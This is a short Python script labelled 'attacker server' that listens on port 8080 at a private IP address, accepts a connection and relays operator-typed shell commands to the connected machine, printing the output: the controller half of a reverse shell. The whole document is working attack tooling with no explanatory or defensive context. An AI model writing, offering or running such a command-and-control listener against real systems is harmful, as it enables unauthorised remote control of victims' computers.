# attacker server
import socket

def connect():
    Mysocket = socket.socket()
    Mysocket.bind(("172.25.191.60", 8080))
    Mysocket.listen(1)
    connection, addres = Mysocket.accept()
    print("Connection established sucessfully", addres)

    while True:
        command = input("Shell> : ")
        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break
        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())

def main():
    connect()

main()
